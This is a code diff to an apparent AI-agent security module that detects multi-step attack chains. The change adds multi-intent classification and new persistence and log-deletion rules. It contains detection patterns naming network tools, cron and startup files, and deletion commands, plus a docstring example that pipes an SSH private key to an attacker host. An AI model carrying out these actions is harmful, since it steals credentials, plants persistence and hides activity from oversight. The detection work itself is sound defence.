@@ -4,7 +4,8 @@ Detects sequences of individually-safe-looking actions that combine into attacks
 recon -> privilege escalation -> data exfiltration.
 
 Enhanced with:
-- Intent classification for richer chain matching
+- Multi-intent classification (one action can match multiple categories)
+- Intent category tracking for richer chain matching
 - Parameter similarity tracking
 - Configurable time windows
 - Custom YAML-defined chain patterns
@@ -42,7 +43,7 @@ class ActionRecord:
     timestamp: float
     parameters_hash: str = ""
     raw_input_snippet: str = ""
-    intent_category: str = ""
+    intent_categories: list[str] = field(default_factory=list)
 
 
 # Built-in chain patterns
@@ -56,7 +57,18 @@ _NETWORK_TOOLS = re.compile(r"(?i)\b(curl|wget|nc|ncat|netcat|ssh|telnet|nmap)\b
 _WRITE_TOOLS = re.compile(r"(?i)\b(echo|tee|write|cat\s*>|mv|cp|install)\b")
 _READ_TOOLS = re.compile(r"(?i)\b(cat|head|tail|less|more|read|open|view)\b")
 
+# Persistence targets — cron, shell startup files, init systems
+_PERSISTENCE_TARGETS = re.compile(
+    r"(?i)(crontab|/etc/cron|\.bashrc|\.profile|\.bash_profile|"
+    r"/etc/init\.d|/etc/systemd|/etc/rc\.local|launchd|\.plist)"
+)
+
+# Log file patterns and deletion commands — used for cover-tracks detection
+_LOG_TARGETS = re.compile(r"(?i)(\.log\b|/var/log|\.bash_history|/proc/[0-9]+|audit\.log)")
+_DELETE_COMMANDS = re.compile(r"(?i)\b(rm\b|truncate\b|shred\b|>\s*/dev/null|unlink\b)")
+
 # Intent category definitions — ordered most-specific first
+# NOTE: Multiple categories can match a single action (multi-intent)
 _INTENT_PATTERNS: list[tuple[str, re.Pattern[str]]] = [
     ("credential_access", _CREDENTIAL_FILES),
     ("escalate", _ESCALATION_TOOLS),
@@ -112,7 +124,7 @@ class ChainDetector:
             timestamp=now,
             parameters_hash=self._parameters_hash(action),
             raw_input_snippet=(action.raw_input or "")[:200],
-            intent_category=self._classify_intent(action, searchable),
+            intent_categories=self._classify_intents(action, searchable),
         )
         self._history[agent_id].append(record)
 
@@ -124,22 +136,30 @@ class ChainDetector:
         # Check custom YAML-defined chain patterns
         return self._check_custom_chains(agent_id, now)
 
-    def _classify_intent(self, action: Action, searchable: str) -> str:
-        """Classify an action's intent into a category for chain matching."""
+    def _classify_intents(self, action: Action, searchable: str) -> list[str]:
+        """Classify an action into ALL matching intent categories (multi-intent).
+
+        Returns a list since one action can simultaneously be recon AND exfil
+        (e.g., cat ~/.ssh/id_rsa | curl POST attacker.com).
+        """
+        categories = []
         for category, pattern in _INTENT_PATTERNS:
             if pattern.search(searchable):
-                return category
+                categories.append(category)
 
-        # Fallback: classify by action type
-        type_map = {
-            ActionType.SHELL_COMMAND: "modify",
-            ActionType.CODE_EXECUTION: "modify",
-            ActionType.FILE_ACCESS: "read",
-            ActionType.API_CALL: "network",
-            ActionType.PROMPT: "read",
-            ActionType.OUTPUT: "read",
-        }
-        return type_map.get(action.action_type, "unknown")
+        if not categories:
+            # Fallback: classify by action type
+            type_map = {
+                ActionType.SHELL_COMMAND: "modify",
+                ActionType.CODE_EXECUTION: "modify",
+                ActionType.FILE_ACCESS: "read",
+                ActionType.API_CALL: "network",
+                ActionType.PROMPT: "read",
+                ActionType.OUTPUT: "read",
+            }
+            categories = [type_map.get(action.action_type, "unknown")]
+
+        return categories
 
     @staticmethod
     def _parameters_hash(action: Action) -> str:
@@ -164,11 +184,11 @@ class ChainDetector:
 
         # Chain 1: Recon -> Escalation -> Exfiltration
         has_recon = any(
-            r.intent_category == "recon" or _RECON_TOOLS.search(r.tool_name or "")
+            "recon" in r.intent_categories or _RECON_TOOLS.search(r.tool_name or "")
             for r in recent[:-1]
         )
         has_escalation = any(
-            r.intent_category == "escalate" or _ESCALATION_TOOLS.search(r.tool_name or "")
+            "escalate" in r.intent_categories or _ESCALATION_TOOLS.search(r.tool_name or "")
             for r in recent[:-1]
         )
         is_exfil = bool(_EXFIL_TOOLS.search(current_text))
@@ -189,7 +209,7 @@ class ChainDetector:
 
         # Chain 2: Credential file access -> Exfiltration
         has_cred_access = any(
-            r.intent_category == "credential_access"
+            "credential_access" in r.intent_categories
             or _CREDENTIAL_FILES.search(r.tool_name or "")
             for r in recent[:-1]
         )
@@ -221,6 +241,41 @@ class ChainDetector:
                 ),
                 decision=Decision.ESCALATE,
                 matched_pattern=f"repeated_escalate:{escalate_count}",
+            )
+
+        # Chain 4: Write to persistence location (cron, init, shell startup)
+        has_write = any("write" in r.intent_categories for r in recent[:-1])
+        is_persistence_write = bool(_PERSISTENCE_TARGETS.search(current_text))
+        if has_write and is_persistence_write:
+            return RuleMatch(
+                rule_id="chain-persistence",
+                rule_name="persistence_chain_detected",
+                layer=DefenseLayer.EXECUTION,
+                risk_level=RiskLevel.CRITICAL,
+                description=(
+                    "Persistence chain detected: prior write activity followed by "
+                    "write to system startup/cron location"
+                ),
+                decision=Decision.BLOCK,
+                matched_pattern="write->persistence",
+            )
+
+        # Chain 5: Any prior action followed by log/history deletion (cover tracks)
+        is_log_deletion = bool(
+            _LOG_TARGETS.search(current_text) and _DELETE_COMMANDS.search(current_text)
+        )
+        if len(recent) >= 2 and is_log_deletion:
+            return RuleMatch(
+                rule_id="chain-cover-tracks",
+                rule_name="cover_tracks_detected",
+                layer=DefenseLayer.EXECUTION,
+                risk_level=RiskLevel.HIGH,
+                description=(
+                    "Cover-tracks pattern detected: prior activity followed by "
+                    "log or history deletion"
+                ),
+                decision=Decision.ESCALATE,
+                matched_pattern="action->log_deletion",
             )
 
         return None
@@ -268,10 +323,14 @@ class ChainDetector:
     def _matches_sequence(
         records: list[ActionRecord], sequence: list[str]
     ) -> bool:
-        """Check if action records contain the intent sequence in order."""
+        """Check if action records contain the intent sequence in order.
+
+        Uses multi-intent categories: a record matches a sequence step if
+        the step's category is in any of the record's intent_categories.
+        """
         seq_idx = 0
         for record in records:
-            if seq_idx < len(sequence) and record.intent_category == sequence[seq_idx]:
+            if seq_idx < len(sequence) and sequence[seq_idx] in record.intent_categories:
                 seq_idx += 1
             if seq_idx == len(sequence):
                 return True
